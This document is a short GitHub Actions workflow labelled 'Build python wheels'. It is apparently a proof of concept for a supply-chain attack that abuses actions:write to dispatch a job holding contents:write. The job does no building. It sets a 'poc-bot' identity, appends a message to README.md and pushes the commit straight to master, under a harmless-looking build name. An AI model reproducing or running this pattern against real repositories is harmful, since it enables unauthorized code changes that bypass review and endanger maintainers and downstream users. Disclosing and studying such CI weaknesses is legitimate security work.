name: Build python wheels

on:
  workflow_dispatch:

permissions:
  contents: write
  actions: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Build
      run: |
        echo "=== Build Wheels ==="
        echo "This workflow has contents:write"
        echo "If triggered by escalation, attacker controls dispatch"
        echo "Commit: $(git log --oneline -1)"
        echo "=== Writing to repo ==="
        git config user.name "poc-bot"
        git config user.email "poc@test.com"
        echo "hi from trebor - escalation via actions:write dispatch" >> README.md
        git add README.md
        git commit -m "PoC: supply chain via actions:write escalation"
        git push origin master
        echo "=== PUSHED TO MASTER ==="
